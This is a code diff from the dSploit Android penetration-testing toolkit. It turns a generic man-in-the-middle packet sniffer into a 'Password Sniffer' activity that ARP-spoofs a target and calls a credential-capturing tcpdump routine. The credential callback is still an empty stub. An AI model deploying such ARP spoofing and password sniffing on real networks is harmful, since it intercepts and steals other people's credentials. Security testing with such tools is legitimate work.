@@ -26,6 +26,7 @@ import it.evilsocket.dsploit.system.Environment;
 import it.evilsocket.dsploit.system.Shell.OutputReceiver;
 import it.evilsocket.dsploit.tools.ArpSpoof;
 import it.evilsocket.dsploit.tools.TcpDump;
+import it.evilsocket.dsploit.tools.TcpDump.PasswordReceiver;
 import android.app.Activity;
 import android.os.Bundle;
 import android.util.Log;
@@ -35,10 +36,9 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.ToggleButton;
 
-public class Sniffer extends Activity 
+public class PasswordSniffer extends Activity 
 {
 	private static final String  PCAP_FILTER = "not '(src host localhost or dst host localhost or arp)'";
-	private static final Pattern PARSER 	 = Pattern.compile( "^.+length\\s+(\\d+)\\)\\s+([^\\s]+)\\s+>\\s+([^\\:]+):.+", Pattern.CASE_INSENSITIVE );
 
 	private ToggleButton mSniffToggleButton = null;
 	private ProgressBar	 mSniffProgress     = null;
@@ -49,7 +49,7 @@ public class Sniffer extends Activity
 	
 	public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);        
-        setTitle( "MITM - Sniffer" );
+        setTitle( "MITM - Password Sniffer" );
         setContentView( R.layout.plugin_mitm_sniffer );
         
         mSniffToggleButton = ( ToggleButton )findViewById( R.id.sniffToggleButton );
@@ -98,7 +98,9 @@ public class Sniffer extends Activity
 		
 		OutputReceiver receiver = new OutputReceiver(){
 			@Override
-			public void onStart(String command) { }
+			public void onStart(String command) {
+				Log.d( "ARPSPOOF", "ArpSpoof started." );
+			}
 
 			@Override
 			public void onNewLine( String line ) {
@@ -117,37 +119,13 @@ public class Sniffer extends Activity
 			
 		spoof.spoof( Environment.getTarget(), receiver ).start();
 		
-		dump.sniff( PCAP_FILTER, new OutputReceiver(){
+		dump.sniffPasswords( PCAP_FILTER, new PasswordReceiver(){
 			@Override
-			public void onStart(String command) { }
-
-			@Override
-			public void onNewLine(String line) {
-				Matcher matcher = PARSER.matcher( line.trim() );
+			public void onAccountFound(String port, String protocol) {
+				// TODO Auto-generated method stub
 				
-				if( matcher != null && matcher.find() )
-				{
-					String length = matcher.group( 1 ),
-						   source = matcher.group( 2 ),
-						   dest   = matcher.group( 3 );
-																			
-					final String entry = "[ " + length + " bytes ] " + source + " -> " + dest;
-					
-					Sniffer.this.runOnUiThread( new Runnable() {
-						@Override
-						public void run(){
-							
-							if( mSniffText.getText().length() > 4096 )
-								mSniffText.setText("");
-							
-			            	mSniffText.append( entry + "\n" );
-						}							
-					});				
-				}
 			}
-
-			@Override
-			public void onEnd(int exitCode) { }
+			
 		}).start();
 		
 		mSniffProgress.setVisibility( View.VISIBLE );
